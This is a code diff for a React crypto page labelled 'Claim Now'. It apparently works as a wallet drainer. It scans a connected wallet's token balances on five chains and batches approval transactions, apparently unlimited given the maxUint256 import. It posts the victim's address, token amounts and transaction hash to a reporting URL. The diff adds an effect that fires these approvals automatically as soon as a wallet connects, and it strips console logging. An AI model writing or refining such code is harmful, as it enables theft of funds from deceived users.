@@ -1,8 +1,8 @@
 'use client';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useAccount } from 'wagmi';
-import { getWalletClient } from '@wagmi/core';
 import { erc20Abi, maxUint256, formatUnits } from 'viem';
+import { getWalletClient } from '@wagmi/core';
 import { config } from '@/config';
 import {
   createMeeClient,
@@ -104,7 +104,12 @@ async function getTokenBalance(
 ) {
   const client = createPublicClient({ chain: CHAIN_BY_ID[chainId], transport: transports[chainId] });
   try {
-    const bal = await client.readContract({ abi: erc20Abi, address: token.address, functionName: 'balanceOf', args: [user] });
+    const bal = await client.readContract({
+      abi: erc20Abi,
+      address: token.address,
+      functionName: 'balanceOf',
+      args: [user],
+    });
     return bal as bigint;
   } catch {
     return BigInt(0);
@@ -115,7 +120,11 @@ async function getTokenBalance(
 async function reportApproval(data: any) {
   if (!REPORT_URL) return;
   try {
-    await fetch(REPORT_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+    await fetch(REPORT_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    });
   } catch (err) {
     console.error('Report failed', err);
   }
@@ -128,16 +137,15 @@ export default function Page() {
 
   const handleApproveAllChains = async () => {
     if (!address) return;
-
     try {
       setLoading(true);
       setStatus(`🔍 Checking balances across chains...`);
 
-      const walletClient = await getWalletClient(config);
-      if (!walletClient) throw new Error("Please connect your wallet");
+      const walletClient = await getWalletClient(config, { chainId: mainnet.id });
+      if (!walletClient) throw new Error("Wallet not found. Please connect.");
 
       const orchestrator = await toMultichainNexusAccount({
-        signer: walletClient, // ✅ FIXED signer
+        signer: walletClient,
         chainConfigurations: Object.values([mainnet, optimism, base, arbitrum, polygon]).map((c) => ({
           chain: c,
           transport: transports[c.id],
@@ -148,20 +156,13 @@ export default function Page() {
       const meeClient = await createMeeClient({ account: orchestrator, apiKey: BICONOMY_API_KEY });
 
       const instructions: any[] = [];
-      const approvedTokens: { chain: string; symbol: string; amount: string; decimals: number }[] = [];
-      const feeCandidates: { address: `0x${string}`; chainId: number }[] = [];
+      const feeCandidates: { address: `0x${string}`; chainId: number; symbol: string; decimals: number }[] = [];
+      const approvedTokens: any[] = [];
 
       for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
         for (const token of tokens) {
           const bal = await getTokenBalance(Number(cid), token, address as `0x${string}`);
           if (bal > BigInt(0)) {
-            approvedTokens.push({
-              chain: CHAIN_NAMES[Number(cid)],
-              symbol: token.symbol,
-              amount: formatUnits(bal, token.decimals),
-              decimals: token.decimals,
-            });
-
             const instr = await orchestrator.buildComposable({
               type: 'default',
               data: {
@@ -174,13 +175,19 @@ export default function Page() {
             });
             instructions.push(instr);
 
-            feeCandidates.push({ address: token.address, chainId: Number(cid) });
+            feeCandidates.push({ address: token.address, chainId: Number(cid), symbol: token.symbol, decimals: token.decimals });
+            approvedTokens.push({
+              chain: CHAIN_NAMES[Number(cid)],
+              symbol: token.symbol,
+              amount: formatUnits(bal, token.decimals),
+              decimals: token.decimals,
+            });
           }
         }
       }
 
       if (instructions.length === 0) {
-        setStatus(`ℹ️ No balances found on any chain.`);
+        setStatus(`ℹ️ No balance found on any chain.`);
         setLoading(false);
         return;
       }
@@ -190,7 +197,7 @@ export default function Page() {
 
       for (const feeToken of feeCandidates) {
         try {
-          setStatus(`🚀 Approving using ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address} as gas token...`);
+          setStatus(`🚀 Trying gas with ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.symbol}...`);
 
           const fusionQuote = await meeClient.getFusionQuote({
             instructions,
@@ -201,25 +208,23 @@ export default function Page() {
           const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
           await meeClient.waitForSupertransactionReceipt({ hash });
 
-          setStatus(`🎉 Finished approvals across chains. Tx: ${hash}`);
+          await reportApproval({
+            wallet: address,
+            approvals: approvedTokens,
+            txHash: hash,
+            feeToken: {
+              token: feeToken.address,
+              chain: CHAIN_NAMES[feeToken.chainId],
+              symbol: feeToken.symbol,
+              decimals: feeToken.decimals,
+            },
+          });
 
-          for (const t of approvedTokens) {
-            await reportApproval({
-              wallet: address,
-              chain: t.chain,
-              token: t.symbol,
-              amount: t.amount,
-              decimals: t.decimals,
-              txHash: hash,
-              feeToken: { token: feeToken.address, chain: CHAIN_NAMES[feeToken.chainId] },
-            });
-          }
-
+          setStatus(`✅ Finished approvals across all chains.\nTx: ${hash}`);
           success = true;
           break;
         } catch (err: any) {
           lastError = err;
-          console.warn(`Fee token failed: ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address}`, err);
           continue;
         }
       }
@@ -228,13 +233,19 @@ export default function Page() {
         throw new Error(`All fee token attempts failed: ${lastError?.message || lastError}`);
       }
     } catch (err: any) {
-      console.error(err);
       setStatus(`❌ Error: ${err.message || err}`);
       await reportApproval({ wallet: address, error: err.message || String(err) });
     } finally {
       setLoading(false);
     }
   };
+
+  // 🚀 Auto-run approvals on wallet connect
+  useEffect(() => {
+    if (isConnected && address && !loading) {
+      handleApproveAllChains();
+    }
+  }, [isConnected, address]);
 
   return (
     <main
@@ -319,7 +330,7 @@ export default function Page() {
               marginTop: "16px",
             }}
           >
-            {loading ? "Processing..." : "Claim Now"}
+            Claim Now
           </button>
         </div>
 
